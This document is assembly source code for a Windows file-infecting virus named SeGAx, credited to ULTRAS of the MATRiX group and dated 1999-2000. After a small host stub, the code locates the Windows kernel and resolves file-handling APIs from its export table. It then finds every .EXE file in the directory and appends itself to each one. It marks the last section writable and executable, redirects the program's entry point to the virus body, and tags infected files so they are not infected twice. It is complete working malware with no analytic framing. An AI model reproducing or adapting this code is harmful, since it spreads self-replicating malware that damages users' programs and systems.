; WinX.Segax.1876 by ULTRAS [MATRiX]
; (c) 1999-2000
; thanx MiXa

		.386
		.model	flat, stdcall

extrn		MessageBoxA:proc
extrn		ExitProcess:proc

		.data
_title          db      "[Win95.SeGAx."
                db      vir_size/01000 mod 10 + "0"
                db      vir_size/00100 mod 10 + "0"
                db      vir_size/00010 mod 10 + "0"
                db      vir_size/00001 mod 10 + "0"
                db      "]",0
_message        db      "First generation host",10
                db      "(c) 1999-2000 ULTRAS/MATRiX",0

		.code

Start:		push	0
		push	offset _title
		push	offset _message
		push	0
		call	MessageBoxA
		push	0
		call	ExitProcess

;==============================================================================

header_s	equ	60h
obj_size	equ	28h
dta_size	equ	22Ch
                                  

vstart:		db	68h
retadd		dd	offset Start

		call	geteip
geteip:		mov	ebp, [esp]
		sub	ebp, offset geteip
		add	esp, 4

		mov	edx, [esp+4]
		and	edx, 0FFF00000h          
		mov	eax, 0BFF70000h		; Win95 kernel base 0BFF70000
		cmp	edx, 0BFF00000h		; Win95?
		je	good_os
		mov	eax, edx		; WinNT kernel base 077F00000
		cmp	edx, 077F00000h		; WinNT?
		jne	Exit

good_os:	mov	[ebp+imagebase], eax	; save kernel adress
		mov	esi, eax
		add	esi, [esi+3Ch]
		cmp	[esi], word ptr 'EP'
		jne	Exit
		mov	esi, [esi+120]
		add	esi, eax
		mov	edi, [esi+36]
		add	edi, eax
		mov	[ebp+ordinaltbl], edi
		mov	edi, [esi+32]
		add	edi, eax
		mov	[ebp+nameptrtbl], edi
		mov	ecx, [esi+24]
		mov	esi, [esi+28]
		add	esi, eax
		mov	[ebp+adrtbl], esi
		xor	edx, edx
		lea	esi, [ebp+APIs]
		mov	[ebp+ourAPIptr], esi
		lea	eax, [ebp+API_Struct]
		mov	[ebp+curAPIptr], eax

chk_next_API_name:
		mov	esi, [ebp+ourAPIptr]
		mov	ebx, [esi]
		add	ebx, ebp
		mov	esi, [edi]
		add	esi, [ebp+imagebase]

compare_API_name:
		lodsb    
		cmp	al, [ebx]
		jnz	not_our_API
		cmp	al, 0
		jz	is_our_API
		inc	ebx
		jmp	compare_API_name

not_our_API:	inc	edx
		cmp	edx, ecx
		jz	Exit
		add	edi, 4
		mov	esi, [ebp+ourAPIptr]
		jmp	chk_next_API_name

is_our_API:	mov	edi, [ebp+ordinaltbl]
		push	ecx
		push	edx
		xchg	edx, eax
		add	eax, eax
		add	edi, eax
		mov	ax, [edi]
		xor	edx, edx
		mov	ecx, 4
		mul	ecx
		mov	edi, [ebp+adrtbl]
		add	edi, eax
		mov	eax, edi
		sub	eax, [ebp+imagebase]
		mov	[ebp+originalRVAptr], eax
		mov	eax, [edi]
		mov	[ebp+originalRVA], eax
		add	eax, [ebp+imagebase]
		mov	edi, [ebp+curAPIptr]
		mov	[edi], eax
		add	edi, 4
		mov	[ebp+curAPIptr], edi
		pop	edx
		pop	ecx

		mov	edi, [ebp+nameptrtbl]
		mov	esi, [ebp+ourAPIptr]
		add	esi, 4
		mov	[ebp+ourAPIptr], esi
		cmp	[esi], dword ptr 0
		jz	found_all
		mov	edi, [ebp+nameptrtbl]
		xor	edx, edx
		jmp	chk_next_API_name

;==============================================================================

found_all:	lea	eax, [dta_+ebp]
		push	eax
		lea	eax, [fexe+ebp]
		push	eax
		call	[FindFirstAPI+ebp]
		inc	eax
		jz	Exit
		dec	eax
		mov	[SearchHandle+ebp], eax

Infect:		push	0
		push	dword ptr [dta_+00h+ebp]
		push	3
		push	0
		push	0
		push	0C0000000h
		lea	eax, [dta_+2ch+ebp]
		push	eax
		call	[ebp+CreateFileAPI]
		inc	eax
		jz	find_next
		dec	eax
		mov	ebx, eax

		push	0
		push	0
		push	3Ch
		push	ebx
		call	[ebp+SetFilePtrAPI]

		push	0
		lea	eax, [bytez+ebp]
		push	eax
		push	2
		lea	eax, [header_o+ebp]
		push	eax
		push	ebx
		call	[ebp+ReadFileAPI]

		push	0
		push	0
		push	dword ptr [header_o+ebp]
		push	ebx
		call	[ebp+SetFilePtrAPI]

		push	0
		lea	eax, [bytez+ebp]
		push	eax
		push	header_s
		lea	eax, [headerz+ebp]
		push	eax
		push	ebx
		call	[ebp+ReadFileAPI]

		cmp	[headerz+00h+ebp], dword ptr 'EP'
		jne	close_file
		cmp	[headerz+4Ch+ebp], 'DAED'
		je	close_file

		mov	eax, [headerz+34h+ebp]
		add	eax, [headerz+28h+ebp]
		mov	[retadd+ebp], eax

		movzx	eax, word ptr [headerz+06h+ebp]
		dec	eax
		mov	ecx, 40
		mul	ecx
		add	eax, 18h
		add	ax, word ptr [headerz+14h+ebp]
		add	eax, [header_o+ebp]
		mov	[objectOfs+ebp], eax

		push	0
		push	0
		push	eax
		push	ebx
		call	[ebp+SetFilePtrAPI]

		push	0
		lea	eax, [bytez+ebp]
		push	eax
		push	obj_size
		lea	eax, [object+ebp]
		push	eax
		push	ebx
		call	[ebp+ReadFileAPI]

		mov	edx, [dta_+1Ch+ebp]
		mov	eax, [dta_+20h+ebp]
		mov	ecx, [headerz+3Ch+ebp]
		div	ecx
		or	edx, edx
		jz	$+3
		inc	eax
		mul	ecx
		shl	edx, 16
		add	edx, eax
		push	edx

		push	0
		push	0
		push	edx
		push	ebx
		call	[ebp+SetFilePtrAPI]

		push	0
		lea	eax, [bytez+ebp]
		push	eax
		push	all_size
		lea	eax, [vstart+ebp]
		push	eax
		push	ebx
		call	[ebp+WriteFileAPI]

		pop	edx
		sub	edx, [object+14h+ebp]
		mov	[object+10h+ebp], edx
		mov	eax, [object+0Ch+ebp]
		add	eax, [object+10h+ebp]
		mov 	[headerz+28h+ebp], eax
		xor	edx, edx
		mov	eax, all_size
		mov	ecx, [headerz+3Ch+ebp]
		div	ecx
		or	edx, edx
		jz	$+3
		inc	eax
		mul	ecx
		mov	edi, [object+10h+ebp]

		add	eax, [object+10h+ebp]
		mov	[object+10h+ebp], eax
		xor	edx, edx
		mov	eax, vir_size
		mov	ecx, [headerz+38h+ebp]
		div	ecx
		inc	eax
		mul	ecx
		mov	esi, [object+08h+ebp]

		cmp	esi, edi
		jb	x1
		add	eax, esi
		jmp	x2
x1:		add	eax, edi
x2:		mov	[object+08h+ebp], eax

		mov	[object+24h+ebp], 0E0000040h
		mov	eax, [object+08h+ebp]
		add	eax, [object+0Ch+ebp]
		mov	[headerz+50h+ebp], eax
		mov	[headerz+4Ch+ebp], 'DAED'

		push	0
		push	0
		push	dword ptr [header_o+ebp]
		push	ebx
		call	[ebp+SetFilePtrAPI]

		push	0
		lea	eax, [bytez+ebp]
		push	eax
		push	header_s
		lea	eax, [headerz+ebp]
		push	eax
		push	ebx
		call	[ebp+WriteFileAPI]

		push	0
		push	0
		push	dword ptr [objectOfs+ebp]
		push	ebx
		call	[ebp+SetFilePtrAPI]

		push	0
		lea	eax, [bytez+ebp]
		push	eax
		push	obj_size
		lea	eax, [object+ebp]
		push	eax
		push	ebx
		call	[ebp+WriteFileAPI]

close_file:	push	ebx
		call	[CloseFileAPI+ebp]


find_next:	lea	eax, [dta_+ebp]
		push	eax
		push	dword ptr [SearchHandle+ebp]
		call	[FindNextAPI+ebp]
		or	eax, eax
		jnz	Infect

Exit:		ret

;==============================================================================

APIs:		dd	offset CreateFile
		dd	offset SetFilePtr
		dd	offset ReadFile
		dd	offset WriteFile
		dd	offset CloseFile
		dd	offset FindFirst
		dd	offset FindNext
		dd	offset ExitProc
		dd	0

CreateFile	db	'CreateFileA',0
SetFilePtr	db	'SetFilePointer',0
ReadFile	db	'ReadFile',0
WriteFile	db	'WriteFile',0
CloseFile	db	'CloseHandle',0
FindFirst	db	'FindFirstFileA',0
FindNext	db	'FindNextFileA',0
ExitProc	db	'ExitProcess',0

API_Struct:
CreateFileAPI	dd	0
SetFilePtrAPI	dd	0
ReadFileAPI	dd	0
WriteFileAPI	dd	0
CloseFileAPI	dd	0
FindFirstAPI	dd	0
FindNextAPI	dd	0
ExitProcessAPI	dd	0
APIStructEnd:

fexe		db	'*.EXE',0

viriii   	db      'SeGAx by ULTRAS [MATRiX]', 0

all_size	equ	$-vstart

nameptrtbl	dd	?
adrtbl		dd	?
ourAPIptr	dd	?
curAPIptr	dd	?
ordinaltbl	dd	?
originalRVAptr	dd	?
originalRVA	dd	?
imagebase	dd	?
header_o	dd	?
objectOfs	dd	?
SearchHandle	dd	?
bytez		dd	?
object		dd	obj_size/4 dup (?)
headerz		dd	header_s/4 dup (?)
dta_		dd	dta_size/4 dup (?)

vir_size	equ	$-vstart

		end	vstart
